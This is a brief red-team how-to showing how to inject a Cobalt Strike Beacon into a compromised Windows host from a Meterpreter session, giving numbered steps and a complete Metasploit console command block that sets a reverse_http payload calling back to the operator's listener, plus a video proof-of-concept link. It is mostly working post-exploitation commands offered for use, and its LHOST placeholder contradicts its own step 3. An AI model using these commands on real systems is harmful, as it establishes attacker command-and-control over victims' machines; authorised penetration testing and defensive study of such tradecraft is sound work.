# Spawn Beacon from Meterpreter

### To spawn a Beacon from a Meterpreter session use the payload_inject exploit to deliver your Beacon. Here are the steps to do this:

1. Use the exploit/windows/local/payload_inject module

2. Set PAYLOAD to windows/meterpreter/reverse_http for an HTTP Beacon. Set PAYLOAD to windows/meterpreter/reverse_https for an HTTPS Beacon.

3. Set LHOST and LPORT to point to your Cobalt Strike listener.

4. Set DisablePayloadHandler to True.

5. Set SESSION to the session ID of your Meterpreter session

#### And, here’s what this looks like in the Metasploit Framework console:

<pre>
use exploit/windows/local/payload_inject
set PAYLOAD windows/meterpreter/reverse_http
set LHOST [IP address of compromised system]
set LPORT 80
set SESSION 1
set DisablePayloadHandler True
exploit –j
</pre>

[VIDEO POC](https://youtu.be/IZqVpOfQ4zA)